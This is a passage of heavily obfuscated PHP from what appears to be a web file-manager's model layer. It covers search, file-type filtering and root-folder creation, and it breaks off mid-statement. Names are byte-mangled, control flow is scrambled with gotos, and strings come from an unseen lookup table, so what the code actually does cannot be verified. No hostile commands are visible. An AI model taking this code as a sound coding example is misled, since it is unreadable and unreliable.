$cÖÇŸ¶È¥‚ = array(); $F·ëš–Ş£Ó = array(); foreach ($F‚ß ßñÒš as $eó¶…÷÷ì) { if (count($eó¶…÷÷ì) <= 1) { continue; } foreach ($eó¶…÷÷ì as $EíËÓ§ÕäŞ) { $cÖÇŸ¶È¥‚[] = $EíËÓ§ÕäŞ[$aâõ½ÈÕÏÀ[415]]; $F·ëš–Ş£Ó[] = $EíËÓ§ÕäŞ[$aâõ½ÈÕÏÀ[364]]; } } goto F¯Û¹è„ÎË; Ağ®¡’Ìì…: } public function userSpace() { $Aµ’ ÜÈµ =& $_SERVER[÷ÖêïÔÔÓ]; $Fâ˜ŞŞ„­È = $this->tablePrefix; $F×‰“Ÿ¡Ç = array($Aµ’ ÜÈµ[1332] => USER_ID); $DÓ×»Ë¾ê = "{$Fâ˜ŞŞ„­È}\151\x6f\x5f\x66\151\154\145\x20\146\151\x6c\x65\163\x20\157\156\x20\146\151\154\145\x73\x2e\x66\x69\154\x65\x49\x44\40\75\40\x68\151\163\x74\157\162\171\56\146\x69\154\x65\111\x44"; return $this->alias($Aµ’ ÜÈµ[2200])->where($F×‰“Ÿ¡Ç)->join($DÓ×»Ë¾ê, $Aµ’ ÜÈµ[2201])->sum($Aµ’ ÜÈµ[78]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($FˆŸ…Œáé¤) { goto dïìÎ†¼ø; AĞ„Ë¤ã‘š: if (!$A˜ôŸŸ¥) { return array(); } $aì¹Ïˆàµ = $A˜ôŸŸ¥[$d‡†÷Êøì”[157]]; $eµé›±ä = $d‡†÷Êøì”[7]; goto Bêµ¯¾è£¡; Bêµ¯¾è£¡: if (!$A˜ôŸŸ¥[$d‡†÷Êøì”[157]]) { $E²Å„Á‘‚× = array_to_keyvalue($AµƒÚŞÇ½Ö, $d‡†÷Êøì”[33], $d‡†÷Êøì”[157]); $aì¹Ïˆàµ = implode($d‡†÷Êøì”[47], $E²Å„Á‘‚×); $eµé›±ä = $d‡†÷Êøì”[2158]; } $døáÔÇØ‰Ô = explode($d‡†÷Êøì”[47], trim($aì¹Ïˆàµ, $d‡†÷Êøì”[47])); return array($eµé›±ä, $døáÔÇØ‰Ô); goto DÒ×Úñ´äå; dïìÎ†¼ø: $d‡†÷Êøì” =& $_SERVER[÷ÖêïÔÔÓ]; $AµƒÚŞÇ½Ö = KodIO::fileTypeList(); $A˜ôŸŸ¥ = $AµƒÚŞÇ½Ö[$FˆŸ…Œáé¤]; goto AĞ„Ë¤ã‘š; DÒ×Úñ´äå: } public function listPathType($D¼…‚² ·‚) { $EÛ‚ŸÙÖ¥” =& $_SERVER[÷ÖêïÔÔÓ]; $cáåù…ÈÚ = $this->fileTypeWhere($D¼…‚² ·‚); if (!$cáåù…ÈÚ) { return array(); } $A…øêÛ’” = array($EÛ‚ŸÙÖ¥”[514] => SourceModel::TYPE_USER, $EÛ‚ŸÙÖ¥”[515] => USER_ID, $EÛ‚ŸÙÖ¥”[511] => 0, $EÛ‚ŸÙÖ¥”[512] => $cáåù…ÈÚ); return $this->listSource($A…øêÛ’”); } public function listSearch($b†áÜ‚¹çÉ, $C‚ƒ£øÜØ = 300) { goto d‚ŠİÑ¶Ù¤; e§×¯‡’˜: if (!isset($Dæ¢¢áÄ¤‰[$f¸•İ÷‘¯Ñ[393]])) { $Dæ¢¢áÄ¤‰[$f¸•İ÷‘¯Ñ[393]] = 0; } $B‹±å¦¹œ  = $f¸•İ÷‘¯Ñ[2203]; $D˜Õ§™Ğ£ = $B‹±å¦¹œ ; goto f¢£¤ÙĞã¾; f¢£¤ÙĞã¾: $this->_listSearchBindPinyin($b†áÜ‚¹çÉ, $Dæ¢¢áÄ¤‰, $B‹±å¦¹œ ); $this->alias($f¸•İ÷‘¯Ñ[479])->_makeOrder()->cache(null, 10); $A‚»ŒÙ§ŠÜ = $this->distinct(!0)->field($B‹±å¦¹œ )->where($Dæ¢¢áÄ¤‰)->selectPage($C‚ƒ£øÜØ); goto FæÀ¸£Ë·ù; FæÀ¸£Ë·ù: $this->_listSearchDesc($A‚»ŒÙ§ŠÜ, $b†áÜ‚¹çÉ, $D˜Õ§™Ğ£); $this->_listSearchTag($A‚»ŒÙ§ŠÜ, $b†áÜ‚¹çÉ, $D˜Õ§™Ğ£); $this->_listDataApply($A‚»ŒÙ§ŠÜ[$f¸•İ÷‘¯Ñ[350]]); goto Fî¥Ù‡ìà‘; Fî¥Ù‡ìà‘: $this->_listMake($A‚»ŒÙ§ŠÜ); return $A‚»ŒÙ§ŠÜ; goto eíÄÀÃ¡…‘; d‚ŠİÑ¶Ù¤: $f¸•İ÷‘¯Ñ =& $_SERVER[÷ÖêïÔÔÓ]; if (isset($b†áÜ‚¹çÉ[$f¸•İ÷‘¯Ñ[2083]]) && $b†áÜ‚¹çÉ[$f¸•İ÷‘¯Ñ[2083]]) { $b†áÜ‚¹çÉ[$f¸•İ÷‘¯Ñ[2083]] = str_replace($f¸•İ÷‘¯Ñ[1492], $f¸•İ÷‘¯Ñ[2202], trim($b†áÜ‚¹çÉ[$f¸•İ÷‘¯Ñ[2083]])); } $Dæ¢¢áÄ¤‰ = $this->_parseSearchWhere($b†áÜ‚¹çÉ); goto e§×¯‡’˜; eíÄÀÃ¡…‘: } private function _listSearchTag(&$c›¬á¥§ÓÕ, $dÈº«Œ®åŠ, $BŠ‡ä‰·¸) { goto aàïÔë«¹“; a¾»î¼Í…š: $eÊ‘ÎôÁ•Ï = array_to_keyvalue($eÊ‘ÎôÁ•Ï, $b´º©ø§ßù[33], $b´º©ø§ßù[76]); $AÕ¾£¥îŞº = array_unique($eÊ‘ÎôÁ•Ï); $this->_listSearchMerge($c›¬á¥§ÓÕ, $dÈº«Œ®åŠ, $BŠ‡ä‰·¸, $AÕ¾£¥îŞº); goto bğÌÇÎß¾´; B°Å×ŒÅé: $EÚĞ§Ãõ´½ = array(); $aæò¬¹ø“É = $dÈº«Œ®åŠ[$b´º©ø§ßù[2083]]; foreach ($cô‘ƒ©ÁÇƒ as $f¤†ìÅàê) { $F‘ÏË±ç‘ = $f¤†ìÅàê[$b´º©ø§ßù[28]]; $D¿éªÕŒíã = str_replace($b´º©ø§ßù[50], $b´º©ø§ßù[33], Pinyin::encode($F‘ÏË±ç‘)); if (stripos($F‘ÏË±ç‘, $aæò¬¹ø“É) !== !1 || stripos($D¿éªÕŒíã, $aæò¬¹ø“É) !== !1) { $EÚĞ§Ãõ´½[] = $f¤†ìÅàê[$b´º©ø§ßù[364]]; } } goto FÄ°íù­œ‰; aàïÔë«¹“: $b´º©ø§ßù =& $_SERVER[÷ÖêïÔÔÓ]; if (!$dÈº«Œ®åŠ[$b´º©ø§ßù[2083]] || $c›¬á¥§ÓÕ[$b´º©ø§ßù[347]][$b´º©ø§ßù[336]] > 1) { return; } $cô‘ƒ©ÁÇƒ = Model($b´º©ø§ßù[2204])->listData(); goto B°Å×ŒÅé; FÄ°íù­œ‰: if (!$EÚĞ§Ãõ´½) { return; } $eÏ‘ğœ“‡Î = array($b´º©ø§ßù[390] => array($b´º©ø§ßù[7], $EÚĞ§Ãõ´½)); $eÊ‘ÎôÁ•Ï = Model($b´º©ø§ßù[2205])->field($b´º©ø§ßù[76])->where($eÏ‘ğœ“‡Î)->select(); goto a¾»î¼Í…š; bğÌÇÎß¾´: } private function _listSearchDesc(&$aÖëÇŒ•¸Ş, $E×ÜÖÀ¹Ç, $E‰ê®İ•Ì›) { goto AãÉ³ƒàµÌ; bØ»å®†¯: $EÎ‹¬È„ˆº = Model($f—’‚š°„[497])->field($f—’‚š°„[366])->where($CÓÌ²ÂÃéù)->select(); $E†‰‹…ÍÉ¥ = array_to_keyvalue($EÎ‹¬È„ˆº, $f—’‚š°„[33], $f—’‚š°„[366]); $this->_listSearchMerge($aÖëÇŒ•¸Ş, $E×ÜÖÀ¹Ç, $E‰ê®İ•Ì›, $E†‰‹…ÍÉ¥); goto a¢ˆ‘‚†; F¼õÁËÃÈ: $Cš†‹ÃõÅ‰ = array_unique($Cš†‹ÃõÅ‰); if (!$Cš†‹ÃõÅ‰) { return; } $CÓÌ²ÂÃéù = array($f—’‚š°„[366] => array($f—’‚š°„[7], $Cš†‹ÃõÅ‰), $f—’‚š°„[88] => $f—’‚š°„[401], $f—’‚š°„[354] => array($f—’‚š°„[747], $f—’‚š°„[2085] . $E×ÜÖÀ¹Ç[$f—’‚š°„[2083]] . $f—’‚š°„[2085])); goto bØ»å®†¯; AãÉ³ƒàµÌ: $f—’‚š°„ =& $_SERVER[÷ÖêïÔÔÓ]; if (!$E×ÜÖÀ¹Ç[$f—’‚š°„[2083]] || $aÖëÇŒ•¸Ş[$f—’‚š°„[347]][$f—’‚š°„[336]] > 1) { return; } $Cš†‹ÃõÅ‰ = $this->listSearchChildren($E×ÜÖÀ¹Ç[$f—’‚š°„[457]]); goto F¼õÁËÃÈ; a¢ˆ‘‚†: } private function _listSearchMerge(&$d¨ß‡Ñ„š•, $eÌâ˜éÄ†, $e¡»’½ª½ä, $b‘ã¡–Ú¿) { goto C©’ĞùµÌµ; f“ÅµÖÍÖò: $c’ÑŸ‡Ó‹˜ = array_diff($b‘ã¡–Ú¿, $fŸ¹Æ‚Öí‚); if (!$c’ÑŸ‡Ó‹˜) { return; } $Eò‰ŸÈ‘¼Ş = array($D¤õ•Æ¶—‘[366] => array($D¤õ•Æ¶—‘[7], $c’ÑŸ‡Ó‹˜)); goto D¹Ûµ±¶µŠ; D¹Ûµ±¶µŠ: $eÉÆÂ•ï„ = $this->field($e¡»’½ª½ä)->where($Eò‰ŸÈ‘¼Ş)->select(); if (!$eÉÆÂ•ï„) { return; } $B•—Åõ†­ = array(); goto C¯À•éËğ; C¯À•éËğ: foreach ($eÉÆÂ•ï„ as $CßšÃŠÊÙ) { $fîÈŠğŠ¢ = $D¤õ•Æ¶—‘[47] . $eÌâ˜éÄ†[$D¤õ•Æ¶—‘[457]] . $D¤õ•Æ¶—‘[47]; if (stripos($CßšÃŠÊÙ[$D¤õ•Æ¶—‘[455]], $fîÈŠğŠ¢) !== !1) { $B•—Åõ†­[] = $CßšÃŠÊÙ; } } $d¨ß‡Ñ„š•[$D¤õ•Æ¶—‘[350]] = array_merge($B•—Åõ†­, $d¨ß‡Ñ„š•[$D¤õ•Æ¶—‘[350]]); $d¨ß‡Ñ„š•[$D¤õ•Æ¶—‘[347]][$D¤õ•Æ¶—‘[348]] += count($B•—Åõ†­); goto ašªò¥Ñè; C©’ĞùµÌµ: $D¤õ•Æ¶—‘ =& $_SERVER[÷ÖêïÔÔÓ]; if (!$b‘ã¡–Ú¿) { return; } $fŸ¹Æ‚Öí‚ = array_to_keyvalue($d¨ß‡Ñ„š•[$D¤õ•Æ¶—‘[350]], $D¤õ•Æ¶—‘[33], $D¤õ•Æ¶—‘[366]); goto f“ÅµÖÍÖò; ašªò¥Ñè: } public function listSearchChildren($A‚˜‡Ò»’, $C¨ÁÇ¡ª¬Ì = 5000) { goto EÃÜ‘Í³Ú¾; EÃÜ‘Í³Ú¾: $bÛª‰Ğê =& $_SERVER[÷ÖêïÔÔÓ]; $eÄ´®–ì¦ù = array(); $d“¥ß™¯œ = $this->sourceInfo($A‚˜‡Ò»’); goto E–Ñ–Á®éº; Bô×…›ÑÆ£: $F¤´Õ³ìô‡ = $this->field($bÛª‰Ğê[366])->where($fÂ¾¹§Û‰“)->select(); $eÄ´®–ì¦ù = array_to_keyvalue($F¤´Õ³ìô‡, $bÛª‰Ğê[33], $bÛª‰Ğê[366]); return $eÄ´®–ì¦ù; goto b’„í®ˆÛ–; E–Ñ–Á®éº: $fÂ¾¹§Û‰“ = array($bÛª‰Ğê[455] => array($bÛª‰Ğê[747], $d“¥ß™¯œ[$bÛª‰Ğê[455]] . $d“¥ß™¯œ[$bÛª‰Ğê[366]] . $bÛª‰Ğê[476])); $aË†£Õ‡ = $this->field($bÛª‰Ğê[366])->cache(null, 600)->where($fÂ¾¹§Û‰“)->count(); if ($aË†£Õ‡ > $C¨ÁÇ¡ª¬Ì) { return $this->_listSearchChildrenNear($A‚˜‡Ò»’, $C¨ÁÇ¡ª¬Ì); } goto Bô×…›ÑÆ£; b’„í®ˆÛ–: } private function _listSearchChildrenNear($F‡¤—Êƒ¹, $aœòêèÉ¢Ê) { goto BÓÁÈ†³À›; BÓÁÈ†³À›: $A®À¾Œ²¥Ç =& $_SERVER[÷ÖêïÔÔÓ]; $E›ˆ‘À”‰ = array(); $B‘ùğ¹Ô”³ = array($A®À¾Œ²¥Ç[457] => $F‡¤—Êƒ¹); goto a Ú´õ¤Ô¼; BˆÖï ÉáĞ: $E›ˆ‘À”‰ = array_merge($E›ˆ‘À”‰, array_to_keyvalue($A¶Éµ®ä’, $A®À¾Œ²¥Ç[33], $A®À¾Œ²¥Ç[366])); $E›ˆ‘À”‰ = array_slice($E›ˆ‘À”‰, 0, $aœòêèÉ¢Ê); return $E›ˆ‘À”‰; goto DÖ•ğŠï; fÆš­™Üáº: if (!$f¿†„÷èìà) { return $E›ˆ‘À”‰; } $B‘ùğ¹Ô”³ = array($A®À¾Œ²¥Ç[457] => array($A®À¾Œ²¥Ç[7], $f¿†„÷èìà)); $A¶Éµ®ä’ = $this->field($A®À¾Œ²¥Ç[2206])->where($B‘ùğ¹Ô”³)->select(); goto BˆÖï ÉáĞ; a Ú´õ¤Ô¼: $A¶Éµ®ä’ = $this->field($A®À¾Œ²¥Ç[2206])->where($B‘ùğ¹Ô”³)->select(); $f¿†„÷èìà = array_to_keyvalue(array_filter_by_field($A¶Éµ®ä’, $A®À¾Œ²¥Ç[367], $A®À¾Œ²¥Ç[493]), $A®À¾Œ²¥Ç[33], $A®À¾Œ²¥Ç[366]); $E›ˆ‘À”‰ = array_merge($E›ˆ‘À”‰, array_to_keyvalue($A¶Éµ®ä’, $A®À¾Œ²¥Ç[33], $A®À¾Œ²¥Ç[366])); goto fÆš­™Üáº; DÖ•ğŠï: } private function _listSearchBindPinyin($FÜˆçµùË², &$dÁßòÙ¬Ú, &$b·•¯¯ÙØª) { goto Aºİ”ô»×„; Aºİ”ô»×„: $Cá¯ˆ©´İ =& $_SERVER[÷ÖêïÔÔÓ]; if (!Input::check($FÜˆçµùË²[$Cá¯ˆ©´İ[2083]], $Cá¯ˆ©´İ[303]) || strlen($FÜˆçµùË²[$Cá¯ˆ©´İ[2083]]) < 2) { return; } $B©‰‹ô”ã = "\114\x45\x46\x54\40\x4a\x4f\111\116\40{$this->tablePrefix}\x69\x6f\137\163\x6f\165\162\x63\x65\137\x6d\145\164\x61\40\155\x65\164\141\40\157\x6e\x20\163\x6f\x75\x72\x63\145\x2e\163\157\x75\162\x63\x65\x49\x44\x20\75\40\x6d\145\164\141\56\x73\157\165\x72\143\x65\x49\x44"; goto bÙ¨ŞçÀìº; B‰Æ‡ˆİ„: unset($dÁßòÙ¬Ú[$Cá¯ˆ©´İ[28]]); foreach ($dÁßòÙ¬Ú as $CÌõ§² ‹™ => $fƒ‰¥´ßÉ„) { $báÔˆ¨‹ƒÚ[$Cá¯ˆ©´İ[2208] . $CÌõ§² ‹™] = $fƒ‰¥´ßÉ„; } $dÛóˆ—òôƒ = array($Cá¯ˆ©´İ[475], $Cá¯ˆ©´İ[2085] . $FÜˆçµùË²[$Cá¯ˆ©´İ[2083]] . $Cá¯ˆ©´İ[2085]); goto då•´ñ·ÅÁ; då•´ñ·ÅÁ: $báÔˆ¨‹ƒÚ[] = array($Cá¯ˆ©´İ[2210] => $dÛóˆ—òôƒ, $Cá¯ˆ©´İ[910] => $Cá¯ˆ©´İ[2087], array($Cá¯ˆ©´İ[2211] => $dÛóˆ—òôƒ, $Cá¯ˆ©´İ[2212] => array($Cá¯ˆ©´İ[7], array($Cá¯ˆ©´İ[412], $Cá¯ˆ©´İ[411])))); $this->join($B©‰‹ô”ã); $dÁßòÙ¬Ú = $báÔˆ¨‹ƒÚ; goto Aç†çµëÉƒ; bÙ¨ŞçÀìº: $báÔˆ¨‹ƒÚ = array(); $b·•¯¯ÙØª = str_replace(array($Cá¯ˆ©´İ[214], $Cá¯ˆ©´İ[50], $Cá¯ˆ©´İ[2207]), $Cá¯ˆ©´İ[33], $b·•¯¯ÙØª); $b·•¯¯ÙØª = $Cá¯ˆ©´İ[2208] . str_replace($Cá¯ˆ©´İ[47], $Cá¯ˆ©´İ[2209], $b·•¯¯ÙØª); goto B‰Æ‡ˆİ„; Aç†çµëÉƒ: } private function _parseSearchWhere($E»™­Ã£’) { goto f¹·í÷œÇ; f”ÚëÈ·Î: if (isset($E»™­Ã£’[$dŸ–×ÀÜ¢Ö[527]])) { $EÁÂàè¹ÙÇ[] = array($dŸ–×ÀÜ¢Ö[376] => $E»™­Ã£’[$dŸ–×ÀÜ¢Ö[527]], $dŸ–×ÀÜ¢Ö[375] => $E»™­Ã£’[$dŸ–×ÀÜ¢Ö[527]], $dŸ–×ÀÜ¢Ö[910] => $dŸ–×ÀÜ¢Ö[2087]); } if (isset($E»™­Ã£’[$dŸ–×ÀÜ¢Ö[369]])) { $EäêÑ¡ÙÙÚ = $E»™­Ã£’[$dŸ–×ÀÜ¢Ö[369]]; if ($EäêÑ¡ÙÙÚ == $dŸ–×ÀÜ¢Ö[77]) { $EÁÂàè¹ÙÇ[$dŸ–×ÀÜ¢Ö[367]] = 1; } else { if ($EäêÑ¡ÙÙÚ == $dŸ–×ÀÜ¢Ö[2218]) { $EÁÂàè¹ÙÇ[$dŸ–×ÀÜ¢Ö[367]] = 0; } else { if ($EäêÑ¡ÙÙÚ) { $EäêÑ¡ÙÙÚ = is_array($EäêÑ¡ÙÙÚ) ? $EäêÑ¡ÙÙÚ : explode($dŸ–×ÀÜ¢Ö[47], $EäêÑ¡ÙÙÚ); $EÁÂàè¹ÙÇ[$dŸ–×ÀÜ¢Ö[369]] = array($dŸ–×ÀÜ¢Ö[381], $EäêÑ¡ÙÙÚ); $EÁÂàè¹ÙÇ[$dŸ–×ÀÜ¢Ö[367]] = 0; } } } } if (isset($E»™­Ã£’[$dŸ–×ÀÜ¢Ö[457]])) { $f£ƒ¸…õ· = $this->sourceInfo($E»™­Ã£’[$dŸ–×ÀÜ¢Ö[457]]); $EÁÂàè¹ÙÇ[$dŸ–×ÀÜ¢Ö[518]] = array($dŸ–×ÀÜ¢Ö[475], $f£ƒ¸…õ·[$dŸ–×ÀÜ¢Ö[455]] . $E»™­Ã£’[$dŸ–×ÀÜ¢Ö[457]] . $dŸ–×ÀÜ¢Ö[476]); } goto a…–¶Í±Ÿâ; eğÒè…†Ë: if (isset($E»™­Ã£’[$dŸ–×ÀÜ¢Ö[689]])) { $B–ÔÃ©Âï = array($dŸ–×ÀÜ¢Ö[2214], $E»™­Ã£’[$dŸ–×ÀÜ¢Ö[689]]); if ($EÁÂàè¹ÙÇ[$dŸ–×ÀÜ¢Ö[106]]) { $EÁÂàè¹ÙÇ[$dŸ–×ÀÜ¢Ö[106]] = array($EÁÂàè¹ÙÇ[$dŸ–×ÀÜ¢Ö[106]], $B–ÔÃ©Âï, $dŸ–×ÀÜ¢Ö[2215]); } else { $EÁÂàè¹ÙÇ[$dŸ–×ÀÜ¢Ö[106]] = $B–ÔÃ©Âï; } } if (isset($E»™­Ã£’[$dŸ–×ÀÜ¢Ö[2216]])) { $EÁÂàè¹ÙÇ[$dŸ–×ÀÜ¢Ö[78]] = array($dŸ–×ÀÜ¢Ö[2213], $E»™­Ã£’[$dŸ–×ÀÜ¢Ö[2216]]); } if (isset($E»™­Ã£’[$dŸ–×ÀÜ¢Ö[2217]])) { $B–ÔÃ©Âï = array($dŸ–×ÀÜ¢Ö[2214], $E»™­Ã£’[$dŸ–×ÀÜ¢Ö[2217]]); if ($EÁÂàè¹ÙÇ[$dŸ–×ÀÜ¢Ö[78]]) { $EÁÂàè¹ÙÇ[$dŸ–×ÀÜ¢Ö[78]] = array($EÁÂàè¹ÙÇ[$dŸ–×ÀÜ¢Ö[78]], $B–ÔÃ©Âï, $dŸ–×ÀÜ¢Ö[2215]); } else { $EÁÂàè¹ÙÇ[$dŸ–×ÀÜ¢Ö[78]] = $B–ÔÃ©Âï; } } goto f”ÚëÈ·Î; a…–¶Í±Ÿâ: if (isset($E»™­Ã£’[$dŸ–×ÀÜ¢Ö[2083]]) && $E»™­Ã£’[$dŸ–×ÀÜ¢Ö[2083]]) { $DœïëùÊ‡î = $E»™­Ã£’[$dŸ–×ÀÜ¢Ö[2083]]; $e†øéãÜ”¬ = explode($dŸ–×ÀÜ¢Ö[50], $DœïëùÊ‡î); if (strlen($DœïëùÊ‡î) > 2 && (substr($DœïëùÊ‡î, 0, 1) == $dŸ–×ÀÜ¢Ö[112] && substr($DœïëùÊ‡î, -1) == $dŸ–×ÀÜ¢Ö[112]) || substr($DœïëùÊ‡î, 0, 1) == $dŸ–×ÀÜ¢Ö[55] && substr($DœïëùÊ‡î, -1) == $dŸ–×ÀÜ¢Ö[55]) { $DœïëùÊ‡î = substr($DœïëùÊ‡î, 1, -1); $e†øéãÜ”¬ = array($DœïëùÊ‡î); } $EÁÂàè¹ÙÇ[$dŸ–×ÀÜ¢Ö[28]] = array($dŸ–×ÀÜ¢Ö[475], $dŸ–×ÀÜ¢Ö[2085] . $DœïëùÊ‡î . $dŸ–×ÀÜ¢Ö[2085]); if (count($e†øéãÜ”¬) > 1) { $EÁÂàè¹ÙÇ[$dŸ–×ÀÜ¢Ö[28]] = array(); foreach ($e†øéãÜ”¬ as $e¶´Ñ ã½ç) { if (!trim($e¶´Ñ ã½ç)) { continue; } $EÁÂàè¹ÙÇ[$dŸ–×ÀÜ¢Ö[28]][] = array($dŸ–×ÀÜ¢Ö[475], $dŸ–×ÀÜ¢Ö[2085] . trim($e¶´Ñ ã½ç) . $dŸ–×ÀÜ¢Ö[2085]); } } } return $EÁÂàè¹ÙÇ; goto AÚó«ó§›î; f¹·í÷œÇ: $dŸ–×ÀÜ¢Ö =& $_SERVER[÷ÖêïÔÔÓ]; $EÁÂàè¹ÙÇ = array(); if (isset($E»™­Ã£’[$dŸ–×ÀÜ¢Ö[688]])) { $EÁÂàè¹ÙÇ[$dŸ–×ÀÜ¢Ö[106]] = array($dŸ–×ÀÜ¢Ö[2213], $E»™­Ã£’[$dŸ–×ÀÜ¢Ö[688]]); } goto eğÒè…†Ë; AÚó«ó§›î: } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($fİÚÉƒÖ¦Ğ) { $fàäæ÷šÖ„ =& $_SERVER[÷ÖêïÔÔÓ]; $D…ƒò‹¶Šº = Model($fàäæ÷šÖ„[466])->where(array($fàäæ÷šÖ„[1332] => $fİÚÉƒÖ¦Ğ))->find(); $fÇ®¦ÉÚ‚‚ = $this->_mkdirRoot(SourceModel::TYPE_USER, $fİÚÉƒÖ¦Ğ, $D…ƒò‹¶Šº[$fàäæ÷šÖ„[28]]); $this->userDesktopAdd($fÇ®¦ÉÚ‚‚); return $fÇ®¦ÉÚ‚‚; } public function userDesktopAdd($f¸Ç¸•°…Å) { $FÛŒà—Ü ª =& $_SERVER[÷ÖêïÔÔÓ]; $dÂ‹½äõ“– = LNG($FÛŒà—Ü ª[2219]); $A˜°­Ş‡Ïä = $this->mkdir($f¸Ç¸•°…Å, $dÂ‹½äõ“–); $this->metaSet($A˜°­Ş‡Ïä, $FÛŒà—Ü ª[2220], $FÛŒà—Ü ª[493]); $this->metaSet($f¸Ç¸•°…Å, $FÛŒà—Ü ª[2221], $A˜°­Ş‡Ïä); } public function groupRootAdd($AÔíˆÄÍ) { $DñÚŠÁÏ¤Ç =& $_SERVER[÷ÖêïÔÔÓ]; $bÊ¯¹ù‰¦… = Model($DñÚŠÁÏ¤Ç[454])->where(array($DñÚŠÁÏ¤Ç[2079] => $AÔíˆÄÍ))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $AÔíˆÄÍ, $bÊ¯¹ù‰¦…[$DñÚŠÁÏ¤Ç[28]]); } public function systemRootPathAdd($cŸñ³ó¨´’) { if ($cŸñ³ó¨´’ != $_SERVER[÷ÖêïÔÔÓ][1058]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $cŸñ³ó¨´’); } public function userRootRemove($F˜Ë¿Ñšøå) { $BäàÖØĞ‹™ = $this->sourceRoot(SourceModel::TYPE_USER, $F˜Ë¿Ñšøå); if (!$BäàÖØĞ‹™) { return; } $this->remove($BäàÖØĞ‹™, !1); } public function groupRootRemove($Aó•º’Øßœ) { $dõò£—ƒ… = $this->sourceRoot(SourceModel::TYPE_GROUP, $Aó•º’Øßœ); if (!$dõò£—ƒ…) { return; } $this->remove($dõò£—ƒ…, !1); } private function _mkdirRoot($d×±íĞ“Ğ, $AÑ ÕÚ³ŞŠ, $c›ª…Ë½‹) { goto eÄôŠØ‹Œ; FÖ¦Ï¶•›§: $EÉğöÏ‡…ƒ = "\115\x6f\144\145\x6c\x53\157\x75\x72\143\x65\56\x6d\x6b\144\x69\x72\x52\157\157\164\56{$d×±íĞ“Ğ}\x2e{$AÑ ÕÚ³ŞŠ}\x2e" . $c›ª…Ë½‹; CacheLock::lock($EÉğöÏ‡…ƒ); $F“«šÓØß[$c‰Î‰–¬ Ç[28]] = $c›ª…Ë½‹; goto Eµ˜´á¾; eÄôŠØ‹Œ: $c‰Î‰–¬ Ç =& $_SERVER[÷ÖêïÔÔÓ]; $F“«šÓØß = array($c‰Î‰–¬ Ç[365] => 0, $c‰Î‰–¬ Ç[514] => $d×±íĞ“Ğ, $c‰Î‰–¬ Ç[515] => $AÑ ÕÚ³ŞŠ, $c‰Î‰–¬ Ç[511] => 1, $c‰Î‰–¬ Ç[516] => USER_ID, $c‰Î‰–¬ Ç[517] => USER_ID, $c‰Î‰–¬ Ç[512] => $c‰Î‰–¬ Ç[33], $c‰Î‰–¬ Ç[518] => $c‰Î‰–¬ Ç[2076], $c‰Î‰–¬ Ç[392] => 0, $c‰Î‰–¬ Ç[513] => 0, $c‰Î‰–¬ Ç[416] => 0, $c‰Î‰–¬ Ç[2222] => $c‰Î‰–¬ Ç[33]); if ($d·¿ø«ŠÄ© = $this->where($F“«šÓØß)->find()) { return $d·¿ø«ŠÄ©[$c‰Î‰–¬ Ç[366]]; } goto FÖ¦Ï¶•›§; Eµ˜´á¾: $FÔ‹±õ§‚ = $this->add($F“«šÓØß); $eÒÊ¥·¸£‰ = array($c‰Î‰–¬ Ç[519] => short_id($FÔ‹±õ§‚)); $this->where(array($c‰Î‰–¬ Ç[380] => $FÔ‹±õ§‚))->save($eÒÊ¥·¸£‰); goto B†¿ÔåŠÕ; B†¿ÔåŠÕ: CacheLock::unlock($EÉğöÏ‡…ƒ); return $FÔ‹±õ§‚; goto B„Ğ©à¯ç‰; B„Ğ©à¯ç‰: } private function sourceRoot($F¿¬Ûˆç¹, $dõ‚¶ñß§ã, $aÕ±¦æ£» = false) { $f—÷ÒàÔëå =& $_SERVER[÷ÖêïÔÔÓ]; $D”¢Ñƒšğ’ = array($f—÷ÒàÔëå[365] => 0, $f—÷ÒàÔëå[514] => $F¿¬Ûˆç¹, $f—÷ÒàÔëå[515] => $dõ‚¶ñß§ã); if ($E‡©Ú‹‹ = $this->where($D”¢Ñƒšğ’)->find()) { return $aÕ±¦æ£» ? $E‡©Ú‹‹ : $E‡©Ú‹‹[$f—÷ÒàÔëå[366]]; } return !1; } public function sourceRootGroup($F¿à¼ëÕİ±) { $bÛ°·Õ‚ï =& $_SERVER[÷ÖêïÔÔÓ]; if (is_string($F¿à¼ëÕİ±)) { $F¿à¼ëÕİ± = array($F¿à¼ëÕİ±); } $eï«ö‹çİ = array($bÛ°·Õ‚ï[365] => 0, $bÛ°·Õ‚ï[514] => SourceModel::TYPE_GROUP, $bÛ°·Õ‚ï[515] => array($bÛ°·Õ‚ï[7], $F¿à¼ëÕİ±)); $BØƒÛ‘‰‹Ò = $this->listSource($eï«ö‹çİ, 1000); return array_to_keyvalue($BØƒÛ‘‰‹Ò[$bÛ°·Õ‚ï[75]], $bÛ°·Õ‚ï[452]); } public function mkfile($Dß¿â­Ğğ, $b‘ô»ºøœ , $D¢ËßÀ¾­½ = '', $c¾…é•†À = REPEAT_RENAME) { $B¸½ˆ‹·¼Ü = Model($_SERVER[÷ÖêïÔÔÓ][536])->addFileByContent($D¢ËßÀ¾­½, $b‘ô»ºøœ ); return $this->_createFileCall($Dß¿â­Ğğ, $b‘ô»ºøœ , $B¸½ˆ‹·¼Ü, $c¾…é•†À); } public function addFile($F’É†åØ‹®, $B¬ƒâŸ–À˜, $däãØÒÀ, $DÆæôö¯ì¥ = false, $aáê¦Ä­‹ = REPEAT_RENAME) { $bŠÃÖ‘—ÅØ = Model($_SERVER[÷ÖêïÔÔÓ][536])->addFile($B¬ƒâŸ–À˜, $däãØÒÀ, $DÆæôö¯ì¥); return $this->_createFileCall($F’É†åØ‹®, $däãØÒÀ, $bŠÃÖ‘—ÅØ, $aáê¦Ä­‹); } public function addFileByFileID($EÔ”†‘À¥, $E‹ŸÎ¯—§, $EŒ¥î©£»Å, $BĞ–İ’‚¯¨ = REPEAT_RENAME) { $C…±°–§İ¨ =& $_SERVER[÷ÖêïÔÔÓ]; $aé¨ã¦ô¥Î = Model($C…±°–§İ¨[536])->find($E‹ŸÎ¯—§); Model($C…±°–§İ¨[536])->linkAdd($E‹ŸÎ¯—§); return $this->_createFileCall($EÔ”†‘À¥, $EŒ¥î©£»Å, $aé¨ã¦ô¥Î, $BĞ–İ’‚¯¨); } public function addFileByRemote($c‡Ú…“í¨§, $a§‚Ç´Ø, $eø¼Û±Èùô, $F…‘ùÏòÃ¤ = array(), $BÒøÕÓ†µÂ = REPEAT_RENAME) { $D¹ñï½Äï¿ = 